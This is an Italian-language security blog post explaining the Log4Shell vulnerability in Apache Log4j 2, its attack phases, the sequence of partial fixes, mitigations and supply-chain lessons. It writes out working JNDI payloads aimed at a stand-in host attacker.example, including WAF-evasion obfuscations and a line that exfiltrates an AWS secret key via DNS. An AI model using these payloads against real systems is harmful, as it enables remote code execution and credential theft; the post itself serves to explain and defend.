---
title: "Log4Shell: anatomia di un attacco che ha rotto mezza Internet"
date: 2026-10-23 09:00:00 +0200
categories: Security
related: [java, supply-chain, devops]
reading_time: 10
audience: dev
---

Nell'articolo su [PHP2Shell]({% post_url it/2026-10-22-php2shell-shopify-security %}) ho scritto che quella vulnerabilità "non è banale come Log4Shell". Vale la pena spiegare perché Log4Shell è diventata il metro di paragone di ogni RCE catastrofica: non per quanto fosse sofisticata, ma per quanto fosse **banale da innescare** e **impossibile da censire**.

A dicembre 2021 bastava scrivere una stringa di una riga nel posto giusto — spesso un campo che l'utente controlla senza nemmeno autenticarsi — per eseguire codice arbitrario su server che non sapevano nemmeno di usare la libreria vulnerabile.

### Cos'è Log4Shell

Log4Shell è la **CVE-2021-44228** (CVSS 10.0, il massimo) in **Apache Log4j 2**, la libreria di logging più diffusa dell'ecosistema Java. Colpisce le versioni `log4j-core` dalla **2.0-beta9** alla **2.14.1**.[^nvd]

Il punto chiave: non è una vulnerabilità di un'applicazione specifica, ma di una **dipendenza** che si trova dentro migliaia di prodotti — da server enterprise a videogiochi come Minecraft, da apparati di rete a servizi cloud. Molti amministratori sono stati vulnerabili senza avere la minima idea di avere Log4j in produzione, perché era una dipendenza **transitiva**: tirata dentro da un'altra libreria, da un framework, da un prodotto chiuso.

#### La causa: JNDI dentro i message lookup

Log4j 2 supporta i **lookup**: segnaposto nel formato `${...}` che vengono espansi a runtime. Servono, ad esempio, a inserire nel log variabili d'ambiente (`${env:USER}`), proprietà di sistema (`${sys:...}`) o la data.

Il problema è che:

1. l'espansione dei lookup era attiva **di default anche sul contenuto del messaggio loggato**, non solo sul pattern di formattazione;
2. tra i lookup disponibili c'era `jndi`, che invoca la **Java Naming and Directory Interface**.

JNDI è un'API Java per risolvere "nomi" su directory remote: LDAP, RMI, DNS. E JNDI, nella sua configurazione storica, era in grado di **scaricare e istanziare una classe Java da un server remoto** come risultato di una lookup.

Mettendo insieme i pezzi: se un attaccante riusciva a far loggare a Log4j la stringa

```
${jndi:ldap://attacker.example/a}
```

la libreria la interpretava come un comando, contattava il server LDAP dell'attaccante e, seguendo la risposta, caricava ed eseguiva una classe scelta dall'attaccante. **Esecuzione di codice remoto a partire da una semplice riga di log.**

#### Come si strutturava e organizzava l'attacco

A differenza di PHP2Shell — che richiede memory grooming, offset precisi e affinità del worker — qui la catena era lineare e riproducibile. Ecco come veniva organizzata, per fasi.

**1. Ricognizione e spraying del canary.** L'attaccante non sapeva in anticipo quali target fossero vulnerabili né dove finisse il log. La tecnica era inondare ogni input possibile con un payload "a eco", usando un dominio di callback unico per ogni bersaglio:

```
${jndi:dns://TARGET-ID.canary.attacker.example/x}
```

Questa stringa veniva infilata ovunque un valore potesse finire in un log: header HTTP (`User-Agent`, `X-Forwarded-For`, `Referer`), campi username, oggetti email, nomi file, messaggi in chat di gioco. Quando sul proprio server DNS (o su strumenti come Burp Collaborator / interactsh) arrivava una risoluzione per `TARGET-ID.canary...`, l'attaccante sapeva due cose: quel target era vulnerabile e *quale* input veniva loggato. Tutto questo **pre-autenticazione**, perché gli header di una richiesta li scrive chiunque.

**2. Preparazione dell'infrastruttura di consegna.** Confermato un target, l'attaccante preparava due server:

- un **server LDAP/RMI malevolo** (tipicamente con il tool pubblico `marshalsec`), che alla richiesta JNDI rispondeva con un *referral*: "la classe che cerchi è su questo HTTP";
- un **server HTTP** che ospitava la classe compilata (`Exploit.class`) con il codice da eseguire nel suo blocco di inizializzazione statica o nel costruttore.

**3. Innesco.** Si rimandava al target il payload "armato", stavolta puntando al server LDAP:

```
${jndi:ldap://attacker.example:1389/Exploit}
```

Quando Log4j loggava la stringa: espandeva il lookup → JNDI contattava l'LDAP dell'attaccante → riceveva il referral verso l'HTTP → scaricava `Exploit.class` → lo istanziava → il codice partiva con i **privilegi del processo Java** (spesso elevati). Da qui: reverse shell, C2, e si procedeva.

**4. Evasione dei WAF.** Appena uscite le prime firme, gli attaccanti sfruttarono il fatto che i lookup sono **annidabili e componibili** per offuscare la stringa e aggirare i filtri che cercavano il letterale `jndi`:

```
${${lower:j}ndi:${lower:l}${lower:d}ap://...}
${${::-j}${::-n}${::-d}${::-i}:ldap://...}
```

Per il parser di Log4j erano equivalenti a `jndi:ldap`; per un WAF che cercava la stringa esatta, no.

**5. Variante "data exfiltration" senza RCE.** Anche dove il caricamento di classi remote era già bloccato (vedi sotto), restava una via d'uscita preziosa: usare i lookup per **leggere un segreto e spedirlo via DNS**.

```
${jndi:ldap://${env:AWS_SECRET_ACCESS_KEY}.attacker.example/x}
```

Il valore della variabile d'ambiente finiva nel sottodominio della query DNS, e l'attaccante lo leggeva sul proprio resolver. Niente shell, ma credenziali in chiaro. Questo funzionava su molti più target del full-RCE.

**6. Post-exploitation di massa.** Nei giorni successivi la scansione fu automatizzata su tutta Internet: botnet, coin miner (Kinsing, Mirai), ransomware e access broker usarono Log4Shell come porta d'ingresso. Non era un attacco mirato, era pesca a strascico.

#### Perché l'RCE funzionava (e la storia dei "fix parziali")

La parte di JNDI che scarica codice remoto era già considerata rischiosa: dal JDK 8u191 l'opzione `com.sun.jndi.ldap.object.trustURLCodebase` è `false` di default, il che blocca il caso più semplice (il referral a un `.class` remoto).

Ma non bastava, per due motivi:

- moltissimi server giravano su JDK più vecchi o mal configurati;
- anche con `trustURLCodebase=false`, il server LDAP poteva restituire un **oggetto Java serializzato** la cui deserializzazione innescava una **gadget chain** presente nel classpath dell'applicazione (le stesse catene degli attacchi di deserializzazione Java). JNDI era il grilletto, i gadget già presenti erano la pallottola.

Ecco perché la correzione è stata un percorso, non un singolo commit[^apache]:

- **2.15.0** — JNDI disattivato di default e lookup limitati, ma restava un bypass (**CVE-2021-45046**);
- **2.16.0** — rimossa completamente la gestione dei message lookup e JNDI disabilitato di default;
- **2.17.0** — chiusa una **CVE-2021-45105** (denial of service da lookup ricorsivi);
- **2.17.1** — ulteriore hardening su JNDI (**CVE-2021-44832**).

Chi ha applicato la "prima patch" e si è fermato è rimasto esposto per settimane.

#### Fix e mitigazioni

- **Patch**: aggiornare `log4j-core` ad almeno **2.17.1** (o alla patch backport fornita dal vendor del prodotto che lo incorpora).[^cisa]
- **Se non si poteva aggiornare subito** (mitigazioni dell'epoca): impostare `log4j2.formatMsgNoLookups=true`, oppure rimuovere fisicamente la classe `JndiLookup` dal jar:
  `zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class`.
- A valle: WAF con regole aggiornate (consapevoli dell'offuscamento), blocco in uscita delle connessioni LDAP/RMI dai server applicativi verso Internet.

### Il punto che conta: non puoi patchare ciò che non sai di avere

Qui sta la vera lezione, ed è l'opposto di quella di PHP2Shell. Con PHP sai di avere PHP. Con Log4Shell, il problema numero uno delle prime 48 ore non è stato *applicare* la patch: è stato **scoprire dove fosse Log4j**.

- Era dentro prodotti commerciali chiusi, dove non puoi toccare le dipendenze e devi aspettare la patch del vendor.
- Era una dipendenza transitiva: non compariva nel tuo `pom.xml`, la tirava dentro un'altra libreria.
- Era in forme non ovvie: un `.jar` dentro un `.war` dentro un container, un jar rinominato, una copia shadata e re-impacchettata (uber-jar) in cui la stringa `log4j-core` non appariva nemmeno.

La difesa reale non è stata una regola WAF più furba, ma sapere **cosa gira in produzione**:

- una **SBOM** (Software Bill of Materials) aggiornata, per rispondere in minuti — non giorni — alla domanda "siamo esposti?";
- **scansione delle dipendenze** nella pipeline CI (OWASP Dependency-Check, Trivy, Grype, Dependabot) che fallisce la build su una CVE critica nota;
- **inventario degli asset**, perché il server dimenticato è quello che ti compromette;
- blocco di default del traffico in uscita dai server applicativi: un'app che non deve mai aprire connessioni LDAP verso Internet non dovrebbe poterlo fare, e quella regola avrebbe neutralizzato l'intera fase 3 dell'attacco.

### In sintesi

- **Log4Shell** (CVE-2021-44228, CVSS 10.0) è una RCE pre-autenticata in Log4j 2: una stringa `${jndi:ldap://...}` finita in un log bastava a eseguire codice remoto.
- La catena era **lineare e riproducibile** (canary → LDAP malevolo → classe/gadget → RCE), e perciò si prestava a scansioni di massa automatizzate.
- L'offuscamento tramite lookup annidati rese inutili le prime firme dei WAF; la variante via DNS esfiltrava segreti anche senza RCE.
- Il fix è stato un **percorso** (2.15 → 2.16 → 2.17 → 2.17.1), non un singolo commit: fermarsi alla prima patch lasciava esposti.
- La difesa decisiva non era tecnica sul payload, ma **gestionale sulla supply chain**: SBOM, scansione delle dipendenze e inventario. Non puoi patchare ciò che non sai di avere.

[^nvd]: NIST NVD, [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228).
[^apache]: Apache Logging Services, [Log4j — Security](https://logging.apache.org/log4j/2.x/security.html): elenco delle CVE e delle versioni che le correggono.
[^cisa]: CISA, [Apache Log4j Vulnerability Guidance](https://www.cisa.gov/news-events/news/apache-log4j-vulnerability-guidance).
